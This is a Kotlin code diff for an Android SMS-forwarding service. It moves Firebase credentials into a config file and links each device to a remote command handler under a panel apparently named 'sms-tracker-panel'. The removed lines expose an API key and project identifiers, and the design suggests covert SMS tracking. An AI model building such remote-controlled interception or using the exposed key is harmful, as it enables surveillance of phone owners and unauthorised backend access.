@@ -29,6 +29,7 @@ import kotlin.coroutines.suspendCoroutine
 import android.os.IBinder
 import com.smsforwarder.R
 import com.smsforwarder.ui.MainActivity
+import com.smsforwarder.utils.ConfigReader
 import com.smsforwarder.utils.DeviceUtils
 import com.smsforwarder.utils.PrefsManager
 
@@ -40,7 +41,6 @@ class ForwarderService : Service() {
         const val ACTION_STOP = "com.smsforwarder.ACTION_STOP"
         const val ACTION_CHECK_NOW = "com.smsforwarder.ACTION_CHECK_NOW"
         private const val TAG = "ForwarderService"
-        private const val FIREBASE_URL = "https://sms-tracker-panel-default-rtdb.asia-southeast1.firebasedatabase.app/"
     }
 
     private val serviceJob = Job()
@@ -57,23 +57,28 @@ class ForwarderService : Service() {
         super.onCreate()
         prefs = PrefsManager(this)
 
+        val firebaseUrl = ConfigReader.getFirebaseUrl(this)
+        val apiKey = ConfigReader.getApiKey(this)
+        val applicationId = ConfigReader.getApplicationId(this)
+        val projectId = ConfigReader.getProjectId(this)
+
         try {
             if (FirebaseApp.getApps(this).isEmpty()) {
                 val options = FirebaseOptions.Builder()
-                    .setApiKey("AIzaSyB1dkVvK74aR4ZWTjNkP2UKxWN2vznp5t4")
-                    .setApplicationId("1:456557726432:android:505cb65fbb3a305fae9e85")
-                    .setProjectId("sms-tracker-panel")
-                    .setDatabaseUrl(FIREBASE_URL)
+                    .setApiKey(apiKey)
+                    .setApplicationId(applicationId)
+                    .setProjectId(projectId)
+                    .setDatabaseUrl(firebaseUrl)
                     .build()
                 FirebaseApp.initializeApp(this, options)
-                Log.d(TAG, "✅ Firebase Initialized")
+                Log.d(TAG, "✅ Firebase Initialized from config.json")
             }
         } catch (e: Exception) {
             Log.e(TAG, "❌ Firebase Init Failed: ${e.message}")
         }
 
         val deviceId = DeviceUtils.getUniqueDeviceId(this)
-        databaseRef = FirebaseDatabase.getInstance(FIREBASE_URL).getReference("devices/$deviceId")
+        databaseRef = FirebaseDatabase.getInstance(firebaseUrl).getReference("devices/$deviceId")
         commandHandler = CommandHandler(this, databaseRef)
     }
 
